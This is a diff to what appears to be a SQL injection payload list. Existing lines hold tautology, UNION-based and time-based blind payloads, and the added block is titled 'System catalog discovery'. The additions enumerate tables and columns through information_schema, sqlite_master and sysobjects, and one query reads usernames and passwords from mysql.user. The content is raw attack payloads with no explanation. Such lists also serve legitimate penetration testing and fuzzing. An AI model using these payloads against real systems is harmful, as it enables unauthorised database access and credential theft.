@@ -128,3 +128,10 @@ CONCAT(0x27,0x20,0x4F,0x52,0x20,0x31,0x3D,0x31)
 ' UNION SELECT sql FROM sqlite_master --
 ' UNION SELECT name FROM sqlite_master WHERE type='table' --
 ' AND LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(100000000/2)))) --
+
+# === System catalog discovery ===
+(select group_concat(table_name,0x3a,column_name,0x5c6e) from information_schema.columns where table_schema=database())
+1 union select table_name from information_schema.tables
+' and 1=(select count(*) from sqlite_master)--
+x' union select name from sysobjects where xtype='U'--
+select username,password from mysql.user
